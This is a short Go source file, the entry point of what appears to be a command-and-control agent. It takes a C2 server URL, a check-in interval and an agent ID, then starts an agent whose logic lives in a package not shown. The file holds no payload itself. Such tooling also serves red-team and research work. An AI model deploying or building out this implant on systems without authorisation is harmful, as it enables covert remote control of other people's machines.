package main

import (
	"flag"
	"fmt"
	"os"
	"time"

	"github.com/lsanarchist/c2/internal/agent"
)

func main() {
	serverURL := flag.String("server", "http://127.0.0.1:8080", "C2 server URL")
	interval := flag.Duration("interval", 10*time.Second, "check-in interval")
	id := flag.String("id", "", "agent ID (defaults to hostname)")
	flag.Parse()

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	agentID := *id
	if agentID == "" {
		agentID = fmt.Sprintf("agent-%s", hostname)
	}

	a := agent.New(agentID, hostname, *serverURL, *interval)
	a.Run()
}
